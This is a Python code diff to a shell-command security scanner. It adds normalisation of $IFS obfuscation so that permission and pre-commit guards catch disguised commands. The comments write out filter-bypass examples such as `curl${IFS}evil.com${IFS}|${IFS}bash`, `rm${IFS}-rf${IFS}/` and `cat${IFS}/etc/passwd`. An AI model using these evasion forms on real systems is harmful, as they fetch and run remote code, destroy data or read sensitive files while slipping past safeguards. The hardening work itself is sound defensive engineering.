@@ -358,6 +358,171 @@ def redact_secrets(text: str) -> str:
 _HEREDOC_START_RE = re.compile(r"<<-?\s*['\"]?([A-Za-z_][A-Za-z0-9_]*)['\"]?")
 
 
+def _normalize_unquoted_ifs(text: str) -> str:
+    """Replace unquoted `$IFS`/`${IFS}` with a literal space.
+
+    WHY this exists as its own quote-aware scanner, not inline in whichever
+    function happened to need it first: unquoted `$IFS`/`${IFS}` undergoes
+    bash word-splitting exactly like a literal space (IFS defaults to
+    space/tab/newline) -- `cat${IFS}/etc/passwd` is one of the most common
+    real-world WAF/restricted-shell filter-bypass techniques. Found while
+    writing this module's own adversarial test suite (2026-09): `echo
+    secret${IFS}>${IFS}.env` produced ZERO extracted redirect targets from
+    security_verify.py's `_bash_redirect_targets` -- a complete, silent
+    bypass of the .env write-detection this module exists to provide,
+    because the glued `secret${IFS}>${IFS}.env` token never matched the
+    `>`-prefix redirect pattern at all.
+
+    WHY a standalone function rather than folding this into
+    `_quote_aware_chain_split` alone (the first fix attempted, and
+    INSUFFICIENT): `shell_statement_tokens` is called directly by
+    `permission_policy.py` and `pre_commit_guard.py` -- bypassing
+    `_quote_aware_chain_split`/`split_shell_statements` entirely, per
+    `permission_policy.py`'s own documented reason (chain-splitting there
+    would separate the exact substring its DANGEROUS_PATTERNS entries need,
+    e.g. `"curl | bash"`). Fixing IFS only inside `_quote_aware_chain_split`
+    left that whole call path -- the one actually enforcing `rm -rf` /
+    `curl | bash` denial -- still bypassable via `rm${IFS}-rf${IFS}/` or
+    `curl${IFS}evil.com${IFS}|${IFS}bash`. This function is called from
+    BOTH real entry points (`_quote_aware_chain_split` and
+    `shell_statement_tokens`) so every consumer is covered regardless of
+    which path it uses.
+    """
+    out: list[str] = []
+    in_quote: str | None = None
+    i = 0
+    n = len(text)
+    while i < n:
+        ch = text[i]
+        if in_quote:
+            out.append(ch)
+            if ch == in_quote:
+                in_quote = None
+            i += 1
+            continue
+        if ch == "\\" and i + 1 < n:
+            out.append(ch)
+            out.append(text[i + 1])
+            i += 2
+            continue
+        # WHY .upper() comparison, not an exact-case match (real bug found
+        # running this fix through permission_policy.py's own `decide()`
+        # end-to-end, not just this function in isolation): `decide()`
+        # lowercases the WHOLE command (`cmd_lower = command.lower()`) for
+        # unrelated case-insensitive DANGEROUS_PATTERNS matching, BEFORE
+        # `_dequote` -> `shell_statement_tokens` -> this function ever see
+        # it. A real attacker's `$IFS` (bash requires the real variable
+        # name uppercase) arrives here already rewritten to `$ifs` by that
+        # upstream lowercasing -- an exact-case check would silently miss
+        # every real attack that reaches this function through that path,
+        # which is exactly the call site this fix exists to protect
+        # (rm -rf / curl | bash denial). Matching case-insensitively costs
+        # nothing on the paths that DON'T lowercase (a literal, unrelated
+        # `$ifs`/`${ifs}` substring is vanishingly unlikely to appear
+        # legitimately glued between two other tokens).
+        # WHY the whole `${IFS...}` parameter-expansion FAMILY, not just the
+        # bare `${IFS}` form (P1 finding, adversarial security review,
+        # 2026-09 -- confirmed live against a real bash, not just theory):
+        # `${IFS:0:1}` (substring), `${IFS#x}`/`${IFS%x}` (prefix/suffix
+        # trim) all derive their VALUE from $IFS, whose default is
+        # whitespace-only -- so unless a script has deliberately reassigned
+        # IFS to something non-whitespace (already a broader, separate
+        # concern this static scanner cannot see), these still resolve to
+        # whitespace and word-split like a literal space. `${IFS}` alone
+        # left every sibling form open: `rm${IFS:0:1}-rf${IFS:0:1}/` still
+        # produced `deny`->`ask` degradation, verified against a live bash.
+        #
+        # WHY `:+` and `/pattern/replacement` are DELIBERATELY EXCLUDED from
+        # the safe set below (second-round adversarial finding, same
+        # session, on this very fix): unlike every operator above, these two
+        # substitute ARBITRARY ATTACKER TEXT, not a value derived from IFS's
+        # own whitespace content. `${var:+word}` substitutes `word` whenever
+        # `var` is set/non-null -- and $IFS is virtually always set (its
+        # default IS space/tab/newline, not unset) -- so `${IFS:+rm}`
+        # evaluates to the literal word "rm", completely unrelated to
+        # whitespace. Confirmed live: `${IFS:+rm} -rf /` normalized (with an
+        # earlier, broader version of this check) to `'  -rf /'` -- the
+        # attacker-controlled word "rm" was ERASED from the scan entirely,
+        # degrading `decide()`'s "rm -rf" deny to "ask", a NEW bypass this
+        # fix would have introduced rather than closed. `${var/pattern/
+        # replacement}` has the identical failure shape: `replacement` is
+        # arbitrary attacker text spliced into IFS's value, confirmed live:
+        # `${IFS/ /rm}-rf${IFS}/` normalized to `' -rf /'`, again erasing
+        # "rm". Erasing text can never HIDE an already-dangerous pattern
+        # that would otherwise be visible (removing characters cannot
+        # manufacture a match), but it absolutely CAN erase the one
+        # occurrence of a dangerous word that arrived via one of these two
+        # operators -- the opposite of "conservative". Every operator kept
+        # in the trigger set below can only ever SHRINK or REORDER
+        # whitespace already inside IFS's value; it can never introduce a
+        # character that was not already whitespace.
+        #
+        # WHY bare `+` (no colon) is ALSO never in the trigger set, not just
+        # `:+` (P2 completeness note, third adversarial review round,
+        # 2026-09): `${var+word}` is `:+`'s colon-less sibling -- "use
+        # alternate value if parameter is SET" (vs `:+`'s "set and
+        # non-null"), and since $IFS is always set, both forms substitute
+        # the identical arbitrary `word` for it. Confirmed live:
+        # `rm${IFS+ -rf /}` really executes as `rm -rf /`. If a future
+        # change to this function "completes" the operator charset by
+        # adding bare `+` alongside `}`/`#`/`%`, it must carry the SAME
+        # exclusion `:+` already has here -- do not add it without also
+        # excluding it, or this reintroduces the identical erasure bug.
+        if (
+            text[i : i + 5].upper() == "${IFS"
+            and i + 5 < n
+            and (
+                text[i + 5] in "}#%"
+                or (text[i + 5] == ":" and not (i + 6 < n and text[i + 6] == "+"))
+            )
+        ):
+            depth = 1
+            j = i + 2  # position right after the opening '{' at i+1
+            while j < n and depth > 0:
+                if text[j] == "{":
+                    depth += 1
+                elif text[j] == "}":
+                    depth -= 1
+                j += 1
+            # WHY only normalize when a real closing brace was actually
+            # found (depth == 0), never on a run-off-the-end fallback (found
+            # while adversarially probing the fix that introduced this
+            # branch, same session): treating an UNTERMINATED `${IFS:0 ...`
+            # as "swallow everything to end of string into one space" would
+            # silently delete whatever dangerous text followed it (e.g.
+            # `rm${IFS:0 -rf /` swallowing " -rf /" entirely) rather than
+            # leaving it available for the substring/token scan that runs
+            # afterward. An unterminated parameter expansion is a bash
+            # syntax error anyway -- nothing here would execute -- so the
+            # only correct move on ambiguous/malformed input is to NOT
+            # swallow: fall through and let the `$` be scanned as a plain
+            # character, leaving the rest of the (already-invalid) text
+            # untouched for downstream detection rather than erased.
+            if depth == 0:
+                out.append(" ")
+                i = j
+                continue
+        if text[i : i + 4].upper() == "$IFS" and not (
+            i + 4 < n and (text[i + 4].isalnum() or text[i + 4] == "_")
+        ):
+            # WHY the word-boundary check: bare (unbraced) `$IFS` must not
+            # swallow a longer, unrelated variable name like `$IFSX`.
+            # The braced `${IFS...}` form above needs no such check -- its
+            # own operator/closing-brace character is already an
+            # unambiguous terminator.
+            out.append(" ")
+            i += 4
+            continue
+        if ch in ("'", '"'):
+            in_quote = ch
+            out.append(ch)
+            i += 1
+            continue
+        out.append(ch)
+        i += 1
+    return "".join(out)
+
+
 def _quote_aware_chain_split(line: str) -> list[str]:
     """Split one line at &&, ||, ;, |, and & -- but never inside a '...' or
     "..." quoted region, never immediately after an unescaped backslash, and
@@ -378,6 +543,7 @@ def _quote_aware_chain_split(line: str) -> list[str]:
     same reason `shlex` tokenization (used downstream on each statement this
     function returns) was chosen over pattern-matching in the first place.
     """
+    line = _normalize_unquoted_ifs(line)
     parts: list[str] = []
     buf: list[str] = []
     in_quote: str | None = None
@@ -473,7 +639,21 @@ def shell_statement_tokens(statement: str) -> list[str]:
     WHY the fallback: malformed quoting in the inspected command must not
     silently disable a security gate -- if real tokenization fails, fall
     back to a naive whitespace split rather than returning no tokens.
+
+    WHY `_normalize_unquoted_ifs` is called HERE too, not only inside
+    `_quote_aware_chain_split`: `permission_policy.py` and
+    `pre_commit_guard.py` call this function directly on the raw command,
+    never going through `split_shell_statements`/`_quote_aware_chain_split`
+    at all (see `permission_policy.py::_dequote`'s own docstring for why it
+    deliberately skips chain-splitting). Without this second call, `$IFS`
+    obfuscation would still defeat `permission_policy.py`'s DANGEROUS_PATTERNS
+    substring scan (`rm${IFS}-rf${IFS}/`, `curl${IFS}evil.com${IFS}|${IFS}bash`)
+    even after the redirect-target bypass above was fixed -- confirmed by
+    this module's own adversarial test suite. The function is idempotent on
+    already-normalized text, so calling it from both entry points on the
+    `shell_command_tokens` path (which goes through both) costs nothing.
     """
+    statement = _normalize_unquoted_ifs(statement)
     try:
         return shlex.split(statement, posix=True)
     except ValueError:
